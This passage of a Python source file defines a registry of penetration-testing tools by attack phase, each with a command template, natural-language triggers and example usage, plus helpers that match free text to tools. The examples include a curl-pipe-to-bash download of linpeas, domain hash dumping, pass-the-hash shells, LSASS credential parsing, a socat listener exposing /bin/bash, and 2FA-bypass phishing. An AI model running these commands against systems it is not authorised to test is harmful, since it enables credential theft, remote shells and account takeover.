                     "kerberoasting", "as-rep roasting", "getnpusers", "getuserspns",
                     "dump hashes dc", "pass the hash", "overpass the hash"],
        "output": "text", "sudo": False,
        "docs": "impacket-secretsdump corp.local/admin:Password1@DC_IP  # Dump all hashes",
    },
    "evil-winrm": {
        "name": "evil-winrm", "phase": "active_directory", "category": "remote_exec",
        "description": "WinRM shell — remote PowerShell access with pass-the-hash and file upload support",
        "command": "evil-winrm -i {target} -u {user} -p {pass}",
        "triggers": ["evil-winrm", "winrm shell", "powershell remote", "remote ps session",
                     "winrm access"],
        "output": "text", "sudo": False,
        "docs": "evil-winrm -i 10.10.10.10 -u Administrator -H ntlm_hash  # PTH mode",
    },
    "enum4linux": {
        "name": "enum4linux-ng", "phase": "active_directory", "category": "smb_enum",
        "description": "SMB/LDAP enumeration — users, groups, shares, password policy from Windows/Samba",
        "command": "enum4linux-ng {target} {flags}",
        "triggers": ["smb enumeration", "enum4linux", "enumerate samba", "enumerate windows",
                     "get users smb", "list shares smb", "windows null session"],
        "output": "text", "sudo": False,
        "docs": "enum4linux-ng -A 10.10.10.10  # Full enumeration with all checks",
    },
    "kerbrute": {
        "name": "kerbrute", "phase": "active_directory", "category": "kerberos",
        "description": "Kerberos user enumeration and password spraying — no lockout risk for user enum",
        "command": "/opt/tools/kerbrute/kerbrute {mode} {flags} --dc {dc} -d {domain}",
        "triggers": ["kerbrute", "kerberos brute", "enumerate ad users", "kerberos user enum",
                     "as-rep roast", "kerberos spray"],
        "output": "text", "sudo": False,
        "docs": "kerbrute userenum users.txt -d corp.local --dc 10.10.10.10",
    },
    "pypykatz": {
        "name": "pypykatz", "phase": "active_directory", "category": "credential_dump",
        "description": "Pure Python Mimikatz implementation — parse LSASS dumps, extract credentials offline",
        "command": "pypykatz {mode} {flags}",
        "triggers": ["pypykatz", "parse lsass", "extract credentials from dump", "offline mimikatz",
                     "read minidump"],
        "output": "text", "sudo": False,
        "docs": "pypykatz lsa minidump lsass.dmp  # Parse captured LSASS dump",
    },

    # ══════════════════════════════════════════════════════════════
    # PHASE 9 — POST EXPLOITATION
    # ══════════════════════════════════════════════════════════════

    "pwncat": {
        "name": "pwncat-cs", "phase": "post_exploit", "category": "shell_handler",
        "description": "Advanced reverse/bind shell handler — auto privesc, file transfer, persistence modules",
        "command": "pwncat-cs {flags}",
        "triggers": ["pwncat", "catch shell", "handle reverse shell", "reverse shell handler",
                     "upgrade shell", "interactive shell"],
        "output": "text", "sudo": False,
        "docs": "pwncat-cs -lp 4444  # Listen; receives shell and drops into pwncat session",
    },
    "linpeas": {
        "name": "linpeas.sh", "phase": "post_exploit", "category": "privesc_enum",
        "description": "Linux privilege escalation script — finds SUID, misconfigs, creds, kernel vulns",
        "command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash",
        "triggers": ["linpeas", "linux privesc", "privilege escalation linux", "find privesc",
                     "enumerate privesc", "linux escalation"],
        "output": "text", "sudo": False,
        "docs": "# Upload to target then: bash linpeas.sh | tee /tmp/lp.txt",
    },
    "winpeas": {
        "name": "winPEASx64.exe", "phase": "post_exploit", "category": "privesc_enum",
        "description": "Windows privilege escalation script — finds registry, service, token, path vulns",
        "command": "winPEASx64.exe {flags}",
        "triggers": ["winpeas", "windows privesc", "privilege escalation windows",
                     "windows escalation", "enumerate windows privesc"],
        "output": "text", "sudo": False,
        "docs": "winPEASx64.exe quiet cmd fast  # Fast mode output",
    },
    "pspy": {
        "name": "pspy", "phase": "post_exploit", "category": "process_monitor",
        "description": "Unprivileged process monitor — sees cronjobs and root processes without root",
        "command": "/opt/tools/pspy/pspy {flags}",
        "triggers": ["pspy", "monitor processes", "watch cron jobs", "see root processes",
                     "process monitoring unprivileged"],
        "output": "text", "sudo": False,
        "docs": "pspy64 -pf -i 1000  # Print commands + files, 1s interval",
    },

    # ══════════════════════════════════════════════════════════════
    # PHASE 10 — FORENSICS & REVERSE ENGINEERING
    # ══════════════════════════════════════════════════════════════

    "volatility3": {
        "name": "vol.py", "phase": "forensics", "category": "memory_forensics",
        "description": "Memory forensics framework — analyze RAM dumps for processes, network, credentials",
        "command": "python3 /opt/tools/volatility3/vol.py -f {image} {plugin}",
        "triggers": ["memory forensics", "volatility", "analyze memory dump", "ram dump analysis",
                     "find processes in memory", "extract passwords from memory"],
        "output": "text", "sudo": False,
        "docs": "vol.py -f mem.raw windows.pslist  |  windows.hashdump  |  linux.bash",
    },
    "binwalk": {
        "name": "binwalk", "phase": "forensics", "category": "firmware",
        "description": "Firmware analysis tool — extracts files, finds signatures, analyzes binary blobs",
        "command": "binwalk {flags} {file}",
        "triggers": ["binwalk", "analyze firmware", "extract firmware", "binary analysis",
                     "find files in binary", "firmware extraction"],
        "output": "text", "sudo": False,
        "docs": "binwalk -e firmware.bin  # Extract all found filesystems/archives",
    },
    "ghidra": {
        "name": "ghidra", "phase": "forensics", "category": "reverse_engineering",
        "description": "NSA reverse engineering tool — decompile binaries, analyze malware, find vulns",
        "command": "ghidra",
        "triggers": ["ghidra", "decompile binary", "reverse engineer", "analyze executable",
                     "decompile malware", "find vulnerability in binary"],
        "output": "text", "sudo": False,
        "docs": "ghidra  # GUI tool; File > Import > Analyze; DecompileWindow shows C-like code",
    },
    "radare2": {
        "name": "radare2", "phase": "forensics", "category": "reverse_engineering",
        "description": "Terminal-based reverse engineering framework — disassemble, debug, patch binaries",
        "command": "r2 {flags} {binary}",
        "triggers": ["radare2", "r2", "disassemble", "debug binary", "patch binary", "analyze elf"],
        "output": "text", "sudo": False,
        "docs": "r2 -A ./binary  # Then: afl (list functions), pdf@main (disassemble main)",
    },
    "autopsy": {
        "name": "autopsy", "phase": "forensics", "category": "disk_forensics",
        "description": "Digital forensics platform — disk image analysis, file recovery, timeline",
        "command": "autopsy",
        "triggers": ["autopsy", "disk forensics", "analyze disk image", "file recovery",
                     "forensic investigation", "find deleted files"],
        "output": "text", "sudo": False,
        "docs": "autopsy  # Web-based UI on :9999; create case, add disk image source",
    },
    "exiftool": {
        "name": "exiftool", "phase": "forensics", "category": "metadata",
        "description": "Read/write metadata from files — PDFs, images, documents; finds hidden info",
        "command": "exiftool {flags} {file}",
        "triggers": ["exiftool", "read metadata", "file metadata", "image metadata",
                     "extract metadata from file", "gps data from image"],
        "output": "text", "sudo": False,
        "docs": "exiftool image.jpg  |  exiftool -Author='New Name' doc.pdf",
    },
    "steghide": {
        "name": "steghide", "phase": "forensics", "category": "steganography",
        "description": "Steganography tool — hide/extract data inside images and audio files",
        "command": "steghide {extract|embed} -sf {file} {flags}",
        "triggers": ["steghide", "steganography", "hidden in image", "extract hidden data",
                     "hide file in image", "steg challenge"],
        "output": "text", "sudo": False,
        "docs": "steghide extract -sf image.jpg -p password  # Extract hidden file",
    },

    # ══════════════════════════════════════════════════════════════
    # PHASE 11 — SOCIAL ENGINEERING
    # ══════════════════════════════════════════════════════════════

    "setoolkit": {
        "name": "setoolkit", "phase": "social_engineering", "category": "framework",
        "description": "Social Engineer Toolkit — phishing, credential harvester, spear phishing campaigns",
        "command": "setoolkit",
        "triggers": ["social engineering toolkit", "set", "setoolkit", "phishing campaign",
                     "credential harvester", "spear phishing", "clone website for phishing"],
        "output": "text", "sudo": True,
        "docs": "setoolkit  # Interactive menu; 1=SE Attacks > 2=Website Attacks > 3=Credential Harvester",
    },
    "gophish": {
        "name": "gophish", "phase": "social_engineering", "category": "phishing",
        "description": "Open-source phishing framework — campaigns, tracking, landing pages, email templates",
        "command": "/opt/tools/gophish/gophish",
        "triggers": ["gophish", "phishing framework", "email phishing", "track phishing",
                     "phishing campaign management"],
        "output": "text", "sudo": False,
        "docs": "gophish  # Admin UI on :3333; create sending profile, template, page, then campaign",
    },
    "evilginx2": {
        "name": "evilginx2", "phase": "social_engineering", "category": "reverse_proxy",
        "description": "Adversary-in-the-middle phishing framework — bypasses 2FA by capturing session cookies",
        "command": "/opt/tools/evilginx2/evilginx2 {flags}",
        "triggers": ["evilginx", "bypass 2fa phishing", "mfa bypass", "session token theft",
                     "advanced phishing", "capture session cookies"],
        "output": "text", "sudo": True,
        "docs": "evilginx2 -developer  # Test mode; use phishlets to configure targets",
    },

    # ══════════════════════════════════════════════════════════════
    # PHASE 12 — CLOUD ATTACKS
    # ══════════════════════════════════════════════════════════════

    "pacu": {
        "name": "pacu", "phase": "cloud", "category": "aws",
        "description": "AWS exploitation framework — enumerate IAM, S3, EC2, Lambda, privesc in AWS",
        "command": "python3 /opt/tools/pacu/pacu.py",
        "triggers": ["pacu", "aws attack", "aws pentest", "aws privesc", "enumerate aws",
                     "aws exploitation", "iam enumeration"],
        "output": "text", "sudo": False,
        "docs": "pacu  # set_keys, then run modules like iam__enum_users_roles_policies_groups",
    },
    "cloudfox": {
        "name": "cloudfox", "phase": "cloud", "category": "aws",
        "description": "Cloud security tool — finds exploitable attack paths in AWS/Azure environments",
        "command": "cloudfox {provider} {command} {flags}",
        "triggers": ["cloudfox", "cloud attack paths", "aws attack paths", "cloud pentesting"],
        "output": "text", "sudo": False,
        "docs": "cloudfox aws --profile default all-checks  # Run all AWS checks",
    },
    "kube-hunter": {
        "name": "kube-hunter", "phase": "cloud", "category": "kubernetes",
        "description": "Kubernetes penetration testing tool — finds security issues in K8s clusters",
        "command": "python3 /opt/tools/kube-hunter/kube-hunter.py {flags}",
        "triggers": ["kube-hunter", "kubernetes pentest", "k8s attack", "kubernetes vulnerabilities",
                     "container escape"],
        "output": "text", "sudo": False,
        "docs": "kube-hunter --remote  # or --pod for in-cluster hunting",
    },

    # ══════════════════════════════════════════════════════════════
    # UTILITY & SUPPORT TOOLS
    # ══════════════════════════════════════════════════════════════

    "netcat": {
        "name": "nc", "phase": "utility", "category": "networking",
        "description": "Netcat — TCP/UDP Swiss army knife, listener, banner grabber, file transfer",
        "command": "nc {flags} {host} {port}",
        "triggers": ["netcat", "nc listener", "catch shell", "banner grab", "tcp connect",
                     "open listener", "file transfer nc", "listen on port"],
        "output": "text", "sudo": False,
        "docs": "nc -lvnp 4444  # Listen for reverse shell;  nc 10.10.10.10 80  # Connect",
    },
    "socat": {
        "name": "socat", "phase": "utility", "category": "networking",
        "description": "Socat — bidirectional data relay, SSL listener, PTY upgrade for shells",
        "command": "socat {address1} {address2}",
        "triggers": ["socat", "upgrade shell pty", "ssl listener", "relay traffic",
                     "fully interactive shell"],
        "output": "text", "sudo": False,
        "docs": "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
    },
    "tcpdump": {
        "name": "tcpdump", "phase": "utility", "category": "capture",
        "description": "Packet capture — captures raw network traffic to file or terminal",
        "command": "tcpdump {flags} -i {interface}",
        "triggers": ["tcpdump", "capture traffic", "packet capture", "sniff traffic",
                     "capture packets", "record network traffic"],
        "output": "pcap", "sudo": True,
        "docs": "tcpdump -i eth0 -w capture.pcap 'port 80 or port 443'",
    },
    "wireshark": {
        "name": "wireshark", "phase": "utility", "category": "analysis",
        "description": "GUI packet analyzer — decode and analyze captured network traffic",
        "command": "wireshark {flags}",
        "triggers": ["wireshark", "analyze pcap", "open pcap", "decode packets",
                     "analyze capture file", "read pcap"],
        "output": "text", "sudo": False,
        "docs": "wireshark -r capture.pcap  # Open capture;  tshark for CLI analysis",
    },
}

# ── Helper Functions ───────────────────────────────────────────────────────────

def get_tools_by_phase(phase: str) -> dict:
    """Return all tools for a given kill chain phase."""
    return {k: v for k, v in TOOL_REGISTRY.items() if v.get("phase") == phase}

def get_tool(name: str) -> Optional[dict]:
    """Get a tool entry by name."""
    return TOOL_REGISTRY.get(name)

def find_tool_by_trigger(text: str) -> list:
    """
    NLP trigger matching — given natural language input,
    return matching tool entries ordered by relevance.
    Uses substring matching on individual trigger words/phrases.
    """
    text_lower = text.lower()
    matches = []
    for tool_key, tool in TOOL_REGISTRY.items():
        score = 0
        for trigger in tool.get("triggers", []):
            t = trigger.lower()
            # Check if all words of the trigger appear in text (word-level match)
            if all(word in text_lower for word in t.split()):
                score += len(t)  # longer trigger = more specific = higher score
        if score > 0:
            matches.append((score, tool_key, tool))
    matches.sort(key=lambda x: x[0], reverse=True)
    return [(key, tool) for _, key, tool in matches]

def list_phases() -> list:
    """Return all unique kill chain phases."""
    return sorted(set(t["phase"] for t in TOOL_REGISTRY.values()))

def list_categories() -> list:
    """Return all unique categories."""
    return sorted(set(t["category"] for t in TOOL_REGISTRY.values()))

def get_tools_requiring_sudo() -> list:
    """Return tools that require root."""
    return [k for k, v in TOOL_REGISTRY.items() if v.get("sudo")]

def tool_count() -> int:
    return len(TOOL_REGISTRY)
